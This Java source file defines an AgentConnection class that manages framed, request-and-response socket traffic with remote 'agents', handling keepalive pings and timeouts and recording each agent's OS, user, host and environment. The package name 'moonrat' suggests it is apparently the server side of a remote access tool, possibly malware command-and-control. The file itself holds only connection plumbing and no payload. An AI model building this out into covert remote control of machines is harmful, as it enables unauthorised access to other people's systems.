package moonrat.server;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

import static moonrat.Protocol.*;

final class AgentConnection {
    final String id;
    private final Socket socket;
    private final DataInputStream in;
    private final DataOutputStream out;
    private final AgentRegistry registry;
    private final AtomicInteger sequence = new AtomicInteger(1);
    private final Map<Integer, CompletableFuture<Frame>> pending = new ConcurrentHashMap<>();
    private final AtomicBoolean closed = new AtomicBoolean();
    String os = "?";
    String user = "?";
    String host = "?";
    String env = "?";
    volatile long lastSeen = System.currentTimeMillis();

    AgentConnection(String id, Socket socket, DataInputStream in, AgentRegistry registry) throws IOException {
        this.id = id;
        this.socket = socket;
        this.in = in;
        this.out = new DataOutputStream(socket.getOutputStream());
        this.registry = registry;
    }

    void start() {
        Thread reader = new Thread(this::readLoop, "agent-" + id);
        reader.setDaemon(true);
        reader.start();

        Thread keepalive = new Thread(this::keepalive, "keepalive-" + id);
        keepalive.setDaemon(true);
        keepalive.start();
    }

    private void readLoop() {
        try {
            while (!closed.get()) {
                Frame frame = readFrame(in);
                lastSeen = System.currentTimeMillis();
                if (frame.type == PONG) continue;

                CompletableFuture<Frame> future = pending.remove(frame.reqId);
                if (future != null) future.complete(frame);
            }
        } catch (IOException ignored) {
        } finally {
            close();
            registry.remove(this);
            System.out.println("[-] agent " + id + " gone");
        }
    }

    private void keepalive() {
        try {
            while (!closed.get()) {
                Thread.sleep(30000);
                if (System.currentTimeMillis() - lastSeen > 90000) {
                    close();
                    return;
                }
                synchronized (out) {
                    writeFrame(out, new Frame(PING));
                }
            }
        } catch (InterruptedException | IOException ignored) {
            close();
        }
    }

    void close() {
        if (!closed.compareAndSet(false, true)) return;

        try {
            socket.close();
        } catch (IOException ignored) {
        }

        IOException gone = new IOException("agent gone");
        pending.values().forEach(future -> future.completeExceptionally(gone));
        pending.clear();
    }

    Frame request(int type, String... fields) throws IOException {
        return request(type, 20, new byte[0], fields);
    }

    Frame request(int type, int timeoutSeconds, byte[] blob, String... fields) throws IOException {
        int requestId = sequence.getAndIncrement();
        CompletableFuture<Frame> future = new CompletableFuture<>();
        pending.put(requestId, future);

        Frame frame = new Frame(type, fields);
        frame.blob = blob;
        frame.reqId = requestId;

        synchronized (out) {
            writeFrame(out, frame);
        }

        try {
            return future.get(timeoutSeconds, TimeUnit.SECONDS);
        } catch (InterruptedException failure) {
            Thread.currentThread().interrupt();
            throw new IOException("interrupted", failure);
        } catch (ExecutionException failure) {
            Throwable cause = failure.getCause() == null ? failure : failure.getCause();
            throw cause instanceof IOException ioException ? ioException : new IOException(cause);
        } catch (TimeoutException failure) {
            throw new IOException("agent timeout");
        }
    }
}
